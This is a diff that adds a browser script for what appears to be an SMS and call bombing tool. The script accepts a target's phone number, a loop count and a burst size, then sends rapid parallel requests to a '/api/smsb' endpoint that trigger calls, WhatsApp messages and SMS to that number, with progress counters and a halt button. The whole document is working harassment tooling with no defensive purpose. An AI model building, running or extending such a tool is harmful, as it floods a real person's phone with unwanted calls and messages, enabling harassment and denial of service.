@@ -1,0 +1,142 @@
+<script>
+(() => {
+  const fireBtn   = document.getElementById('fireBtn');
+  const haltBtn   = document.getElementById('haltBtn');
+  const input     = document.getElementById('targetInput');
+  const countEl   = document.getElementById('countInput');
+  const burstEl   = document.getElementById('burstInput');
+  const grid      = document.getElementById('filterGrid');
+  const wrap      = document.getElementById('progressWrap');
+  const fill      = document.getElementById('progressFill');
+  const pText     = document.getElementById('progressText');
+  const sSent     = document.getElementById('statSent');
+  const sFail     = document.getElementById('statFailed');
+  const sTotal    = document.getElementById('statTotal');
+  const statusEl  = document.getElementById('statusLine');
+
+  const ENDPOINT  = '/api/smsb';
+  const ALL       = ['call', 'whatsapp', 'sms', 'coro'];
+
+  let channel = 'all';
+  let halted  = false;
+  let running = false;
+
+  // ── Filter button handling ─────────────────────────────
+  grid.addEventListener('click', (e) => {
+    const btn = e.target.closest('.filter-btn');
+    if (!btn || running) return;
+    grid.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    channel = btn.dataset.filter;
+  });
+
+  // ── Helpers ────────────────────────────────────────────
+  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+  function setStatus(msg, kind = '') {
+    statusEl.textContent = msg;
+    statusEl.className = 'status-line ' + kind;
+  }
+
+  function updateProgress(done, total, sent, failed) {
+    const pct = total ? (done / total) * 100 : 0;
+    fill.style.width = pct + '%';
+    pText.textContent = `${done} / ${total}`;
+    sSent.textContent = sent;
+    sFail.textContent = failed;
+    sTotal.textContent = total;
+  }
+
+  async function fireOne(filter, number) {
+    const r = await fetch(ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ number, filter }),
+    });
+    // treat any 2xx as success; ALL-mode returns 200 json aggregate
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    return true;
+  }
+
+  async function runBurst(number, filter, burstSize) {
+    const jobs = [];
+    const filters = filter === 'all' ? ALL : [filter];
+    for (let i = 0; i < burstSize; i++) {
+      const f = filters[i % filters.length];
+      jobs.push(fireOne(f, number));
+    }
+    const results = await Promise.allSettled(jobs);
+    return results.filter(r => r.status === 'fulfilled').length;
+  }
+
+  // ── Main fire loop ─────────────────────────────────────
+  async function fire() {
+    if (running) return;
+    const number = (input.value || '').replace(/\D/g, '').slice(-10);
+    if (number.length < 10) {
+      setStatus('✗ Enter a valid 10-digit number, boss man.', 'err');
+      input.focus();
+      return;
+    }
+
+    const totalLoops  = Math.max(1, Math.min(500, +countEl.value || 1));
+    const burstSize   = Math.max(1, Math.min(30, +burstEl.value || 1));
+    const filters     = channel === 'all' ? ALL : [channel];
+    const totalCalls  = totalLoops * (channel === 'all' ? burstSize * ALL.length : burstSize);
+
+    running = true;
+    halted  = false;
+    fireBtn.disabled = true;
+    haltBtn.disabled = false;
+    wrap.classList.add('active');
+    setStatus(`⚡ Firing ${channel.toUpperCase()} · ${totalLoops} loops · burst ${burstSize}…`);
+
+    let sent = 0, failed = 0, done = 0;
+    updateProgress(0, totalCalls, 0, 0);
+
+    for (let loop = 0; loop < totalLoops; loop++) {
+      if (halted) break;
+
+      // per burst
+      const batch = [];
+      for (let b = 0; b < burstSize; b++) {
+        const f = filters[b % filters.length];
+        batch.push(
+          fireOne(f, number)
+            .then(() => { sent++; })
+            .catch(() => { failed++; })
+            .finally(() => {
+              done++;
+              updateProgress(done, totalCalls, sent, failed);
+            })
+        );
+      }
+      await Promise.allSettled(batch);
+      await sleep(120); // throttle between loops
+    }
+
+    running = false;
+    fireBtn.disabled = false;
+    haltBtn.disabled = true;
+
+    if (halted) setStatus(`■ Halted — sent ${sent}, failed ${failed}.`, '');
+    else setStatus(`✓ Done — sent ${sent}, failed ${failed}.`, 'ok');
+  }
+
+  fireBtn.addEventListener('click', fire);
+  haltBtn.addEventListener('click', () => {
+    if (!running) return;
+    halted = true;
+    setStatus('■ Halting… waiting for in-flight requests.', '');
+  });
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') fire();
+  });
+
+  // numeric-only input
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 15);
+  });
+})();
+    </script>
